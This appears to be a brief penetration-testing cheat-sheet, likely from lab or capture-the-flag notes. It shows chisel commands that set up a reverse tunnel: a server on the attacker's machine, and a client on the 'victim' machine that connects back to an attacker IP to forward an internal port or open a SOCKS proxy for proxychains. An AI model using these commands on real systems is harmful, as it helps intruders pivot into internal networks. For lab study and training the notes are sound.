# # `Commands` -
1. On local machine -

```bash
./chisel server --port 9002 --reverse
```

2.  On Remote/Victim machine (Windows ex.) -

```bash
.\chisel.exe client 10.10.14.13:9002 R:8888:localhost:8888
```

For Socks -

```bash
.\chisel.exe client 10.10.14.6:8000 R:socks
```

Now you can use proxychains.

3. verify using `netstat -ntlp` on kali